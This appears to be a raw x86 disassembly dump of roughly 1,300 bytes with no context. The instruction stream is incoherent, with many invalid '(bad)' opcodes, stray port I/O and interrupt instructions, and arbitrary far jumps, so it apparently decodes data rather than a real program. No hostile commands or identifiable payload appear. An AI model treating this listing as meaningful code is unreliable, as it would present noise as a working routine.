  41fead:	mov    ah,0x63
  41feaf:	push   ebp
  41feb0:	out    0xd6,eax
  41feb2:	mov    al,ds:0xaafaeb78
  41feb7:	(bad)  
  41feb9:	sbb    DWORD PTR [edx+0x72],ecx
  41febc:	loopne 0x41fe43
  41febe:	dec    ecx
  41febf:	inc    edi
  41fec0:	xchg   BYTE PTR [edx+esi*2-0x421c4297],ah
  41fec7:	inc    ecx
  41fec8:	pusha  
  41fec9:	in     eax,0x36
  41fecb:	ror    BYTE PTR [ecx-0x3908e37],0x22
  41fed2:	retf   
  41fed3:	jg     0x41feb7
  41fed5:	and    eax,esp
  41fed7:	xor    al,0x2f
  41fed9:	dec    ebx
  41feda:	scas   al,BYTE PTR es:[edi]
  41fedb:	outs   dx,BYTE PTR ds:[esi]
  41fedc:	pop    ebx
  41fedd:	jl     0x41fec3
  41fedf:	adc    edi,ebx
  41fee1:	inc    ecx
  41fee2:	test   BYTE PTR [eax],bh
  41fee4:	cmp    DWORD PTR [ebx-0x54],0xa855100e
  41feeb:	popf   
  41feec:	mov    bl,dh
  41feee:	fcmovnu st,st(0)
  41fef0:	sbb    DWORD PTR [eax-0x37],0x36d23b78
  41fef7:	fdivr  QWORD PTR [ebx-0x3c7883d2]
  41fefd:	lahf   
  41fefe:	add    edi,DWORD PTR [esi]
  41ff00:	mov    ds:0x7f2443ef,al
  41ff05:	xchg   DWORD PTR [esi],ecx
  41ff07:	fucom  st(6)
  41ff09:	addr16 ja 0x41fe9d
  41ff0c:	fdiv   st,st(5)
  41ff0e:	imul   ecx,DWORD PTR fs:[edi+edi*2-0x2c387a07],0x89ea85f4
  41ff1a:	xchg   ebp,eax
  41ff1b:	dec    esi
  41ff1c:	ins    BYTE PTR es:[edi],dx
  41ff1d:	pop    ecx
  41ff1e:	jle    0x41ff34
  41ff20:	and    eax,0x20ed575c
  41ff25:	or     al,0x9e
  41ff27:	fsubr  DWORD PTR [esi]
  41ff29:	pop    ebp
  41ff2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff2b:	retf   
  41ff2c:	push   eax
  41ff2d:	mov    ecx,0x653711aa
  41ff32:	xchg   BYTE PTR [ebp+0x4],dl
  41ff35:	je     0x41ff34
  41ff37:	mov    WORD PTR [edi-0x1b],ds
  41ff3a:	lods   al,BYTE PTR ds:[esi]
  41ff3b:	inc    esi
  41ff3c:	push   0xffffff9d
  41ff3e:	call   0x79ab:0x4de49613
  41ff45:	fdivp  st(3),st
  41ff47:	xchg   edx,eax
  41ff48:	fadd   QWORD PTR [ebx-0x59]
  41ff4b:	lock sti 
  41ff4d:	xchg   edx,eax
  41ff4e:	mov    ecx,DWORD PTR [edx-0x5df24bc2]
  41ff54:	(bad)  
  41ff57:	pop    ss
  41ff58:	test   BYTE PTR [esi+eax*4-0x7e],al
  41ff5c:	and    al,0xd1
  41ff5e:	daa    
  41ff5f:	and    al,0xc4
  41ff61:	pop    edi
  41ff62:	std    
  41ff63:	rol    BYTE PTR [esi],cl
  41ff65:	stos   BYTE PTR es:[edi],al
  41ff66:	popa   
  41ff67:	inc    edi
  41ff68:	jmp    0x41ff12
  41ff6a:	aam    0xef
  41ff6c:	xor    eax,DWORD PTR [esi]
  41ff6e:	gs in  al,0xe3
  41ff71:	inc    edx
  41ff72:	dec    ebp
  41ff73:	stos   BYTE PTR es:[edi],al
  41ff74:	mov    ebx,0x50de353
  41ff79:	loope  0x41ffc3
  41ff7b:	out    0x27,al
  41ff7d:	bound  esp,QWORD PTR [ecx+0x3f0da827]
  41ff83:	out    dx,eax
  41ff84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff85:	ret    0x41e9
  41ff88:	(bad)  [edi-0x7a]
  41ff8b:	push   cs
  41ff8c:	adc    eax,0x32a46815
  41ff91:	not    DWORD PTR [esi-0x56]
  41ff94:	jecxz  0x41ffa4
  41ff96:	xor    dl,BYTE PTR [eax-0x787ed6ac]
  41ff9c:	bnd jns 0x42000e
  41ff9f:	xchg   edi,eax
  41ffa0:	xor    dl,BYTE PTR [eax+eiz*8]
  41ffa3:	inc    edx
  41ffa4:	adc    esp,ebx
  41ffa6:	mov    esi,0x9dfa6a1f
  41ffab:	cmp    ecx,edx
  41ffad:	dec    esi
  41ffae:	add    DWORD PTR [esi],ebx
  41ffb0:	inc    eax
  41ffb1:	cld    
  41ffb2:	imul   esi,DWORD PTR [ecx+0x7c],0xffffffa3
  41ffb6:	and    esi,DWORD PTR [edx+eax*2]
  41ffb9:	xor    al,0x62
  41ffbb:	cli    
  41ffbc:	call   0xd7f1:0x4af928cc
  41ffc3:	stos   BYTE PTR es:[edi],al
  41ffc4:	dec    esi
  41ffc5:	xchg   esp,eax
  41ffc6:	push   es
  41ffc7:	add    dh,BYTE PTR [edi]
  41ffc9:	sar    BYTE PTR [esi],1
  41ffcb:	dec    esp
  41ffcc:	and    DWORD PTR [ebx],edx
  41ffce:	push   edi
  41ffcf:	les    eax,FWORD PTR [ebp+0x3f]
  41ffd2:	call   0x1924:0xdac1f9f
  41ffd9:	sbb    ebp,ebp
  41ffdb:	fmul   st(3),st
  41ffdd:	rcl    DWORD PTR [ebx-0x1c],0x66
  41ffe1:	mov    eax,ss
  41ffe3:	jno    0x41ffa4
  41ffe5:	sbb    DWORD PTR ds:0x2f783ab5,eax
  41ffeb:	adc    eax,0x2be28486
  41fff0:	addr16 cli 
  41fff2:	adc    eax,0x85a0a9de
  41fff7:	pop    edi
  41fff8:	lahf   
  41fff9:	cmp    BYTE PTR [esi-0x26],0xa6
  41fffd:	push   eax
  41fffe:	hlt    
  41ffff:	mul    BYTE PTR [ebp+0x35f35493]
  420005:	mov    al,ds:0xfc184282
  42000a:	mov    dh,0x3b
  42000c:	add    ch,dh
  42000e:	adc    ah,BYTE PTR [edx]
  420010:	xor    BYTE PTR [edx-0x2],cl
  420013:	jnp    0x41ffdb
  420015:	or     DWORD PTR [ebx+0xe946e06],edi
  42001b:	push   edi
  42001c:	mov    BYTE PTR [eax+eiz*1-0x3e],ch
  420020:	outs   dx,BYTE PTR ds:[esi]
  420021:	and    ebp,0xffffffb4
  420024:	sbb    dh,BYTE PTR [eax]
  420026:	and    BYTE PTR [edx],dl
  420028:	dec    eax
  420029:	mov    bh,0xff
  42002b:	inc    edx
  42002c:	xchg   edx,eax
  42002d:	jnp    0x41ffce
  42002f:	fst    DWORD PTR [edx+0x7]
  420032:	dec    esp
  420033:	and    al,0x7
  420035:	jo     0x41ffe0
  420037:	mov    al,ds:0x49712a1b
  42003c:	jo     0x420080
  42003e:	ja     0x41ffe6
  420040:	ss add eax,0xffabf471
  420046:	aaa    
  420047:	jmp    0xd8e54eb5
  42004c:	xchg   ebx,eax
  42004d:	xor    al,0x94
  42004f:	adc    DWORD PTR [ecx+0x3639b2e1],edi
  420055:	bound  edi,QWORD PTR [edi+0x5a]
  420058:	nop
  420059:	sbb    ecx,edx
  42005b:	dec    ebp
  42005c:	mov    esp,0xb02aafa8
  420061:	inc    edi
  420062:	ss dec esi
  420064:	jmp    0xadde:0x96ee7754
  42006b:	push   ecx
  42006c:	shr    BYTE PTR [ebx-0x2e],0xcd
  420070:	lds    eax,FWORD PTR [esi-0x4b5b72af]
  420076:	lds    edx,FWORD PTR [ebp+0x6ebdd43e]
  42007c:	jno    0x420088
  42007e:	clc    
  42007f:	rcr    DWORD PTR [esi],1
  420081:	sub    BYTE PTR [ecx+0x38],al
  420084:	test   al,0x6c
  420086:	mov    dh,0x85
  420088:	je     0x42009e
  42008a:	in     al,dx
  42008b:	cwde   
  42008c:	aam    0x39
  42008e:	enter  0xf140,0x22
  420092:	mov    bh,BYTE PTR [edi]
  420094:	push   es
  420095:	jp     0x420098
  420097:	inc    ebx
  420098:	lahf   
  420099:	sbb    al,0xbb
  42009b:	mov    eax,ds:0xb7314dfc
  4200a0:	pop    eax
  4200a1:	mov    DWORD PTR [edi-0xc2cc129],edx
  4200a7:	(bad)
  4200ab:	inc    esp
  4200ac:	inc    eax
  4200ad:	xchg   DWORD PTR [ebx+0x13],ecx
  4200b0:	stos   BYTE PTR es:[edi],al
  4200b1:	repz dec esi
  4200b3:	iret   
  4200b4:	ds lahf 
  4200b6:	popf   
  4200b7:	xchg   ebx,eax
  4200b8:	push   0x0
  4200ba:	int    0x48
  4200bc:	sbb    eax,DWORD PTR [esp+ecx*1+0x644b2cbe]
  4200c3:	bound  esi,QWORD PTR [ebx+0x2944614f]
  4200c9:	popa   
  4200ca:	mov    ds:0x30caf575,al
  4200cf:	sbb    cl,bh
  4200d1:	(bad)  
  4200d2:	mov    cl,BYTE PTR [edx+ecx*1-0x37fb7490]
  4200d9:	into   
  4200da:	add    al,0x3
  4200dc:	stc    
  4200dd:	adc    al,0x6
  4200df:	mov    al,0x98
  4200e1:	dec    ecx
  4200e2:	fstp   TBYTE PTR [edi-0x3150e0e7]
  4200e8:	(bad)  
  4200e9:	push   edx
  4200ea:	js     0x4200c5
  4200ec:	jge    0x420144
  4200ee:	(bad)  
  4200f0:	jmp    DWORD PTR [ebx+0x2e]
  4200f3:	sub    ah,BYTE PTR [ecx+ebx*2+0x5d]
  4200f7:	outs   dx,DWORD PTR ds:[esi]
  4200f8:	inc    eax
  4200f9:	inc    ecx
  4200fa:	out    dx,eax
  4200fb:	imul   ecx,DWORD PTR [esi],0x5f234ca7
  420101:	pop    ecx
  420102:	jne    0x42008c
  420104:	cli    
  420105:	or     eax,0x21ccfd3c
  42010a:	test   DWORD PTR [eax-0x12],edx
  42010d:	cmp    al,0x2f
  42010f:	std    
  420110:	pop    ebp
  420111:	sbb    di,WORD PTR [eax+eiz*4]
  420115:	lods   eax,DWORD PTR ds:[esi]
  420116:	mov    eax,0xefa6947d
  42011b:	mov    al,0x3e
  42011d:	jmp    0x420144
  42011f:	(bad)  
  420120:	fnstenv [edi+0x1c8a3057]
  420126:	push   dx
  420128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420129:	scas   eax,DWORD PTR es:[edi]
  42012a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42012b:	sti    
  42012c:	shl    BYTE PTR [edx],cl
  42012e:	jle    0x420103
  420130:	mov    ch,0xa1
  420132:	pushf  
  420133:	jno    0x420160
  420135:	repnz mov ?,WORD PTR ds:[esi]
  420139:	mov    ebp,edi
  42013b:	or     esp,eax
  42013d:	nop
  42013e:	push   cs
  42013f:	aam    0xcf
  420141:	(bad)  
  420142:	imul   eax,DWORD PTR [eax-0x408ec618],0x5a
  420149:	imul   ebx,edx,0xffffffc1
  42014c:	mov    ss,WORD PTR [edi-0x49]
  42014f:	dec    ecx
  420150:	mov    edx,0xbc108057
  420155:	mov    eax,ds:0x80f37f7f
  42015a:	aaa    
  42015b:	test   BYTE PTR [esi+0x6136bc38],bh
  420161:	mov    BYTE PTR [eax-0x3f90448a],dh
  420167:	fild   WORD PTR [esp+esi*2-0x704c66cd]
  42016e:	inc    ebx
  42016f:	adc    al,0x21
  420171:	mov    al,ds:0x2b60b06b
  420176:	iret   
  420177:	pusha  
  420178:	ja     0x420114
  42017a:	outs   dx,BYTE PTR ds:[esi]
  42017b:	adc    BYTE PTR [ecx],0xf7
  42017e:	dec    esp
  42017f:	faddp  st(4),st
  420181:	push   eax
  420182:	add    al,0x32
	...
  420190:	add    BYTE PTR [edx+ecx*1-0x6060f363],dl
  420197:	xchg   ebp,eax
  420198:	call   0x13dd:0x7836e732
  42019f:	out    dx,eax
  4201a0:	bnd ret 
  4201a2:	jnp    0x4201a5
  4201a4:	add    BYTE PTR [ebx-0x1fffffd],ch
  4201aa:	push   ss
  4201ab:	dec    esi
  4201ac:	fs pusha 
  4201ae:	mov    dl,0x1c
  4201b0:	arpl   WORD PTR [ecx],bp
  4201b2:	icebp  
  4201b3:	inc    ecx
  4201b4:	pop    ebp
  4201b5:	iret   
  4201b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201b7:	sub    DWORD PTR [ebx-0x2],esi
  4201ba:	or     ch,al
  4201bc:	icebp  
  4201bd:	leave  
  4201be:	adc    esi,esi
  4201c0:	or     ch,ah
  4201c2:	lods   al,BYTE PTR ds:[esi]
  4201c3:	sub    eax,0xb05bc5d5
  4201c8:	es in  al,0x8b
  4201cb:	add    esi,DWORD PTR [ecx-0x53]
  4201ce:	fstp   QWORD PTR [eax+0x67]
  4201d1:	test   BYTE PTR [esi],dh
  4201d3:	lea    ebx,[edx-0x1fa54879]
  4201d9:	mov    bl,0xe5
  4201db:	and    dh,BYTE PTR [edx+0x77761ea6]
  4201e1:	sahf   
  4201e2:	inc    ecx
  4201e3:	push   ebp
  4201e4:	mov    esi,0x5f349964
  4201e9:	cmc    
  4201ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201eb:	mov    DWORD PTR [ecx-0x69aae0b5],ecx
  4201f1:	jl     0x4201ed
  4201f3:	and    al,0xd0
  4201f5:	out    0x99,al
  4201f7:	mov    edx,0xb4432d9e
  4201fc:	retf   0x2077
  4201ff:	mov    eax,ds:0x2e0ef7ac
  420204:	jmp    0x3b40cda5
  420209:	or     BYTE PTR [edx+0xbd3a3ba],cl
  42020f:	push   0xbf4686bd
  420214:	and    DWORD PTR [ecx+0x556a14b2],eax
  42021a:	int    0x73
  42021c:	test   DWORD PTR [eax+0x1],esi
  42021f:	jecxz  0x420292
  420221:	jle    0x4201f4
  420223:	mov    ebp,0x1f503cea
  420228:	repz idiv BYTE PTR [eax-0x5b649f44]
  42022f:	push   ebx
  420230:	call   0xd454b099
  420235:	ins    BYTE PTR es:[edi],dx
  420236:	sbb    BYTE PTR [edx-0x3c],al
  420239:	ds (bad) 
  42023b:	and    al,0x59
  42023d:	xchg   esp,eax
  42023e:	pop    ecx
  42023f:	push   ebx
  420240:	pop    eax
  420241:	add    dl,BYTE PTR [edx+0x2c65eab1]
  420247:	or     DWORD PTR [ebp+0x41c7562f],esi
  42024d:	fnstcw WORD PTR [ebx-0x4f1336db]
  420253:	or     dh,BYTE PTR [esi-0xaf7e5ad]
  420259:	mov    ah,0x77
  42025b:	enter  0x4c46,0x95
  42025f:	rcr    BYTE PTR [esp+edx*8-0x60],cl
  420263:	mov    ebx,0x64d7ae1a
  420268:	push   DWORD PTR [bp+di-0x6f05]
  42026d:	sti    
  42026e:	data16 mov BYTE PTR [esi-0x6f],al
  420272:	push   ecx
  420273:	fstp   TBYTE PTR [esi+eiz*1-0x57e14130]
  42027a:	inc    edi
  42027b:	dec    esp
  42027c:	es cli 
  42027e:	imul   BYTE PTR [edx+edx*2+0x5c571462]
  420285:	adc    eax,0x6f687f3f
  42028a:	test   eax,0x1c102d07
  42028f:	rcr    DWORD PTR [ebp-0x29a8ca6f],cl
  420295:	mov    edx,0x2ed0c69d
  42029a:	test   ebp,edx
  42029c:	inc    eax
  42029d:	lods   al,BYTE PTR ds:[esi]
  42029e:	mov    ebx,0xc43181b3
  4202a3:	jb     0x420242
  4202a5:	cmp    al,0xce
  4202a7:	xchg   edi,eax
  4202a8:	lock xchg edx,eax
  4202aa:	loope  0x420322
  4202ac:	lea    edi,[eax]
  4202ae:	ret    0x741e
  4202b1:	mov    edx,0x8ba9bac7
  4202b6:	xchg   edx,eax
  4202b7:	jp     0x42023b
  4202b9:	ret    0xb96e
  4202bc:	cmp    eax,0x83d0f26f
  4202c1:	cmp    ebx,DWORD PTR [edx+0x2f59f3df]
  4202c7:	add    DWORD PTR [ecx+0x26],esp
  4202ca:	xlat   BYTE PTR ds:[ebx]
  4202cb:	lods   al,BYTE PTR ds:[esi]
  4202cc:	sbb    dl,0x13
  4202cf:	es imul DWORD PTR ss:[ebx-0x74]
  4202d4:	and    BYTE PTR [ebx+0x1bd53390],bl
  4202da:	outs   dx,BYTE PTR ds:[esi]
  4202db:	cmp    DWORD PTR [ebp+ebx*4-0x44],ebp
  4202df:	inc    edx
  4202e0:	sub    DWORD PTR [edi],edx
  4202e2:	(bad)  
  4202e3:	push   ebx
  4202e4:	xor    bh,al
  4202e6:	test   ebp,ebp
  4202e8:	popa   
  4202e9:	dec    eax
  4202ea:	outs   dx,DWORD PTR ds:[esi]
  4202eb:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202ed:	jg     0x4202ef
  4202ef:	and    BYTE PTR [edx-0x3c70e02d],bh
  4202f5:	adc    esp,DWORD PTR [esi]
  4202f7:	cli    
  4202f8:	addr16 (bad) 
  4202fa:	cdq    
  4202fb:	xchg   BYTE PTR [edx+eiz*4+0x1deac08c],cl
  420302:	jl     0x4202b8
  420304:	(bad)  
  420305:	into   
  420306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420307:	stos   DWORD PTR es:[edi],eax
  420308:	mov    bl,0x4c
  42030a:	cmp    dl,BYTE PTR [ecx]
  42030c:	les    edx,FWORD PTR [eax]
  42030e:	lea    ebx,[edi+ebx*1]
  420311:	jp     0x420349
  420313:	arpl   cx,di
  420315:	xor    eax,0x9b58061a
  42031a:	xor    esi,DWORD PTR [edi+0x2e96549b]
  420320:	out    0xee,eax
  420322:	jg     0x420354
  420324:	and    eax,DWORD PTR [edi]
  420326:	in     al,dx
  420327:	das    
  420328:	outs   dx,BYTE PTR ds:[esi]
  420329:	cmp    cl,BYTE PTR [edx-0x18]
  42032c:	jle    0x42035b
  42032e:	aam    0xf6
  420330:	mov    dh,0xfc
  420332:	inc    ebp
  420333:	xchg   esp,eax
  420334:	out    dx,eax
  420335:	stos   BYTE PTR es:[edi],al
  420336:	lock cwde 
  420338:	scas   eax,DWORD PTR es:[edi]
  420339:	or     eax,0x171f81c5
  42033e:	sub    eax,0x8272b88f
  420343:	sbb    eax,0xc1c2a653
  420348:	ds mov dh,0xf5
  42034b:	jo     0x42034e
  42034d:	stos   DWORD PTR es:[edi],eax
  42034e:	sbb    eax,0x509ad8cf
  420353:	or     eax,0x1b080962
  420358:	cdq    
  420359:	sar    DWORD PTR [ebp+0x3e953c24],cl
  42035f:	addr16 shl cl,1
  420362:	xor    esi,DWORD PTR [edi+0x62336e2e]
  420368:	nop
  420369:	out    0x30,al
  42036b:	or     DWORD PTR [ebx],edx
  42036d:	cmp    bl,BYTE PTR [esi+eax*4+0x77]
  420371:	xchg   ecx,eax
  420372:	jbe    0x42030a
  420374:	call   0xd5ca:0x190f1b72
  42037b:	inc    ecx
  42037c:	mov    cl,0x90
  42037e:	fdivr  QWORD PTR [esi+0xf]
  420381:	(bad)  
  420382:	enter  0x80dc,0xcb
  420386:	jae    0x42032f
  420388:	inc    ecx
  420389:	pop    esp
  42038a:	imul   BYTE PTR [esi+ebx*1-0x3395e622]
  420391:	adc    eax,0x49cd0b01
  420396:	clc    
  420397:	adc    al,0x86
  420399:	mov    ch,0x5c
  42039b:	mov    ds:0x6d23ed4b,al
  4203a0:	xadd   edx,ebx
  4203a3:	sub    ebp,ecx
  4203a5:	loop   0x4203b8
  4203a7:	sub    DWORD PTR [edi+0x19],edi
  4203aa:	mov    cl,0x1c
  4203ac:	dec    eax
  4203ad:	fstp   TBYTE PTR [esi+0xb]
  4203b0:	xchg   ecx,eax
  4203b1:	jbe    0x42036a
  4203b3:	pop    es
  4203b4:	dec    esp
  4203b5:	or     al,0x4f
  4203b7:	out    dx,eax
  4203b8:	adc    BYTE PTR [ecx+0x2f0739d7],al
  4203be:	cmp    ecx,ebx
  4203c0:	cmp    al,0x92
  4203c2:	dec    esp
  4203c3:	or     eax,0x2a52cc9e
  4203c8:	xchg   BYTE PTR [ecx-0x24],cl
  4203cb:	imul   ebx,DWORD PTR [esi-0x67],0xffffffe4
  4203cf:	ss xor al,0x5f
  4203d2:	mov    ebp,0x5c4d6576
  4203d7:	(bad)  
  4203d8:	push   ds
  4203d9:	mov    eax,ebp
  4203db:	cmp    bl,BYTE PTR [edx]
  4203dd:	lods   eax,DWORD PTR ds:[esi]
  4203de:	pop    ds
  4203df:	jno    0x420386
  4203e1:	jnp    0x4203ac
  4203e3:	sahf   
  4203e4:	jbe    0x42037e
  4203e6:	enter  0xe5a6,0x42
  4203ea:	ret    
  4203eb:	mov    al,0xdb
  4203ed:	inc    ecx
  4203ee:	xchg   ebx,eax
  4203ef:	adc    eax,0xa41c36f8
  4203f4:	sbb    DWORD PTR [edi+0x21af062d],edx
  4203fa:	push   ds
  4203fb:	fnstcw WORD PTR [ecx]
  4203fd:	or     ecx,DWORD PTR [eax+0x2b]
  420400:	mov    esp,0x3a16caf4
  420405:	iret   
  420406:	adc    eax,0x1bac114c
  42040b:	repnz jmp 0x900f:0xc689077
  420413:	shl    DWORD PTR [edi-0x47341f],1
  420419:	mov    ah,BYTE PTR [edx+0x33ef68d7]
  42041f:	shl    ah,0x55
  420422:	leave  
  420423:	gs aas 
  420425:	mov    ebx,es
  420427:	fistp  QWORD PTR ds:0x8118b397
  42042d:	ins    BYTE PTR es:[edi],dx
  42042e:	test   DWORD PTR [edi+eax*8+0x38d07dac],0x4fa513e5
  420439:	pop    ss
  42043a:	shr    BYTE PTR [ecx],0x87
  42043d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42043e:	cmp    eax,0xfc6f1c67
  420443:	jne    0x420460
  420445:	out    0xf5,eax
  420447:	sbb    eax,0x98be158d
  42044c:	jo     0x420484
  42044e:	fs popf 
  420450:	sbb    eax,0xca20b755
  420455:	int    0xb4
  420457:	popa   
  420458:	push   esp
  420459:	mov    esi,0x554035a
  42045e:	out    dx,eax
  42045f:	push   0x1
  420461:	jns    0x4204b2
  420463:	loopne 0x420416
  420465:	mov    al,0xa2
  420467:	es dec edx
  420469:	xchg   edx,eax
  42046a:	jmp    0x71ec99fe
  42046f:	mov    esi,0xa8968122
  420474:	mov    DWORD PTR [eax-0x463d2468],ecx
  42047a:	mov    dh,0xea
  42047c:	clc    
  42047d:	pop    ecx
  42047e:	add    al,0x9a
  420480:	adc    eax,0x2d14045b
  420485:	xchg   edx,eax
  420486:	std    
  420487:	mov    ecx,0xae1fa76f
  42048c:	adc    esp,DWORD PTR [ecx]
  42048e:	imul   DWORD PTR [edi-0x1d]
  420491:	mov    bh,0x2f
  420493:	jg     0x42049d
  420495:	adc    dh,al
  420497:	jl     0x420427
  420499:	dec    edi
  42049a:	inc    esi
  42049b:	push   ecx
  42049c:	pop    ds
  42049d:	or     dh,0x7e
  4204a0:	mov    esi,0xe305cf07
  4204a5:	retf   0xa0f5
  4204a8:	das    
  4204a9:	cmp    ch,dl
  4204ab:	mov    bl,al
  4204ad:	xchg   edx,edx
  4204af:	lahf   
  4204b0:	das    
  4204b1:	hlt    
  4204b2:	in     al,dx
  4204b3:	inc    eax
  4204b4:	shl    DWORD PTR [edx],cl
  4204b6:	pusha  
  4204b7:	leave  
  4204b8:	inc    edx
  4204b9:	jmp    0xe489:0xb0ea320
  4204c0:	adc    ebp,DWORD PTR [esi]
  4204c2:	gs stos DWORD PTR es:[edi],eax
  4204c4:	mov    ds:0x3b97309e,al
  4204c9:	je     0x42045d
  4204cb:	pop    es
  4204cc:	xlat   BYTE PTR ds:[ebx]
  4204cd:	retf   
  4204ce:	sti    
  4204cf:	mov    bl,0x60
  4204d1:	out    dx,al
  4204d2:	mov    eax,0xb2b6e8ca
  4204d7:	ins    DWORD PTR es:[edi],dx
  4204d8:	ja     0x420465
  4204da:	js     0x4204ed
  4204dc:	and    DWORD PTR [ecx],edx
  4204de:	lods   al,BYTE PTR ds:[esi]
  4204df:	psrlw  mm4,QWORD PTR [ecx-0x42e4a736]
  4204e6:	inc    esi
  4204e7:	aaa    
  4204e8:	mov    bl,0x9b
  4204ea:	jbe    0x4204fe
  4204ec:	push   es
  4204ed:	cmc    
  4204ee:	or     al,BYTE PTR ds:0x807ebb71
  4204f4:	mov    ch,0xb
  4204f6:	mov    WORD PTR [ebx],ds
  4204f8:	push   cs
  4204f9:	mov    ah,0xdc
  4204fb:	dec    eax
  4204fc:	(bad)  
  4204fd:	fisub  DWORD PTR [edi+0x70]
  420500:	jmp    0x420554
  420502:	mov    WORD PTR [ebp-0x21],gs
  420505:	mov    ds:0xdeeaa66e,eax
  42050a:	repz jbe 0x420585
  42050d:	test   BYTE PTR [ecx+esi*2],dh
  420510:	rcl    DWORD PTR [eax+0x46],cl
  420513:	jae    0x420582
  420515:	jnp    0x420505
  420517:	addr16 retf 0xf9eb
  42051b:	mov    ch,0x53
  42051d:	xor    ecx,ebp
  42051f:	add    edi,ebp
  420521:	scas   al,BYTE PTR es:[edi]
  420522:	inc    DWORD PTR [ebx+0x79]
  420525:	out    0x98,eax
  420527:	xor    bl,BYTE PTR [edi+esi*8+0xc2710b2]
  42052e:	cdq    
  42052f:	shr    DWORD PTR ds:0x32af2366,1
  420535:	pop    ss
  420536:	mov    ebx,0xe3d8ee19
  42053c:	lds    eax,FWORD PTR [edx]
  42053e:	mov    BYTE PTR [ecx-0x2b],0x6
  420542:	adc    al,0x4b
  420544:	sub    esp,esi
  420546:	jge    0x4205c3
  420548:	mov    bh,0x86
  42054a:	sub    eax,0x321cf6fb
  42054f:	fcomp  DWORD PTR [ebx+0x8]
  420552:	push   0x7e
	...
  42055f:	add    BYTE PTR [eax],al
  420561:	nop
  420562:	mov    bl,0x8c
  420564:	fild   QWORD PTR [edi-0x1b002c01]
  42056a:	and    dh,0xd4
  42056d:	jp     0x42057e
  42056f:	and    dl,0x6e
  420572:	jg     0x420575
  420574:	add    BYTE PTR [ebx-0x3dfffffd],ch
  42057a:	hlt    
  42057b:	pop    es
  42057c:	std    
  42057d:	jle    0x42058c
  42057f:	sahf   
  420580:	call   FWORD PTR [ebp+eax*4-0x30]
  420584:	mov    ebx,0xdcbfd1e3
  420589:	es pop ebp
  42058b:	call   0x3eeabaf0
  420590:	xchg   ebx,eax
  420591:	cmp    al,0x22
  420593:	ret    0xdf6c
  420596:	push   esi
  420597:	add    DWORD PTR cs:[esi+0x3202adba],ebp
  42059e:	fst    DWORD PTR [eax+edi*4-0x36ee01da]
  4205a5:	inc    BYTE PTR [esi]
  4205a7:	pusha  
  4205a8:	(bad)  
  4205a9:	mov    edi,0x71387d67
  4205ae:	mov    esp,0x5e477cd0
  4205b3:	imul   edi,DWORD PTR [ebx-0x45e2f95a],0x92a4635e
  4205bd:	ins    BYTE PTR es:[edi],dx
  4205be:	mov    DWORD PTR [ebx-0x3],edi
  4205c1:	adc    eax,0xb5162f66
  4205c6:	es inc esi
  4205c8:	scas   al,BYTE PTR es:[edi]
  4205c9:	fadd   st,st(5)
  4205cb:	loop   0x420588
  4205cd:	popf   
  4205ce:	push   0xd27c413a
  4205d3:	fmul   st(2),st
  4205d5:	stos   DWORD PTR es:[edi],eax
  4205d6:	test   DWORD PTR [edx+eax*8-0x18],eax
  4205da:	mov    ah,0xfb
  4205dc:	neg    BYTE PTR [ecx-0x64]
  4205df:	fild   DWORD PTR [ecx+0x53]
  4205e2:	xor    BYTE PTR [edi],ah
  4205e4:	mov    ss,WORD PTR [ebx+edx*2-0x10]
  4205e8:	popf   
  4205e9:	sub    eax,0xcad0e2f6
  4205ee:	addr16 icebp 
  4205f0:	mov    eax,ds:0x3c835ca5
  4205f5:	dec    edx
  4205f6:	xor    ah,ah
  4205f8:	inc    DWORD PTR [ebx-0x32]
  4205fb:	cmp    DWORD PTR [edx],eax
  4205fd:	push   esp
  4205fe:	ins    BYTE PTR es:[edi],dx
  4205ff:	jge    0x42061c
  420601:	jmp    0x42062a
  420603:	enter  0x9bbb,0x3b
  420607:	fldenv [ebx-0x2f496a1d]
  42060d:	mov    al,ds:0x1abdc0f7
  420612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420613:	gs pop ebx
  420615:	ss push edi
  420617:	mov    eax,0xdeffb97c
  42061c:	outs   dx,DWORD PTR ds:[esi]
  42061d:	int    0xe4
  42061f:	aas    
  420620:	sub    BYTE PTR [edi-0x35789cf2],0xbb
  420627:	(bad)  
  420628:	stos   BYTE PTR es:[edi],al
  420629:	das    
  42062a:	or     bl,BYTE PTR [eax+0x5161fc67]
  420630:	push   ebx
  420631:	push   esi
  420632:	mov    esp,DWORD PTR [ebp+0x72]
  420635:	fldenv [edi+0x5d]
  420638:	nop
  420639:	dec    esp
  42063a:	xchg   ebx,eax
  42063b:	sub    eax,DWORD PTR [edx+0x3c]
  42063e:	call   0x2b1a:0xca1689ef
  420645:	or     cl,BYTE PTR [esi]
  420647:	(bad)  
  420648:	shl    DWORD PTR ds:0x3b0c0df,cl
  42064e:	into   
  42064f:	rcr    BYTE PTR [edx],cl
  420651:	jg     0x4205f2
  420653:	mov    ebx,0x1582d36c
  420658:	lods   eax,DWORD PTR ds:[esi]
  420659:	dec    esp
  42065a:	popf   
  42065b:	mov    bh,0x2f
  42065d:	test   esi,esi
  42065f:	and    DWORD PTR [eax+0x3e],edi
  420662:	(bad)  
  420664:	and    DWORD PTR [edi-0x34283835],edi
  42066a:	popf   
  42066b:	xchg   BYTE PTR [ebp-0x48],cl
  42066e:	js     0x4205fd
  420670:	ret    
  420671:	mov    WORD PTR [ecx-0x15],?
  420674:	(bad)  
  420675:	lods   al,BYTE PTR ds:[esi]
  420676:	add    esi,esp
  420678:	dec    esi
  420679:	stos   DWORD PTR es:[edi],eax
  42067a:	lock neg BYTE PTR [edi+edi*4-0x7a6feb10]
  420682:	cwde   
  420683:	scas   eax,DWORD PTR es:[edi]
  420684:	out    0x19,eax
  420686:	sub    eax,0x2118a5
  42068b:	out    0xfa,eax
  42068d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42068e:	xchg   edi,eax
  42068f:	inc    esp
  420690:	aam    0x48
  420692:	dec    eax
  420693:	les    ebp,FWORD PTR [ebp+0x4eed7f71]
  420699:	mov    eax,0x5f05a78e
  42069e:	(bad)  
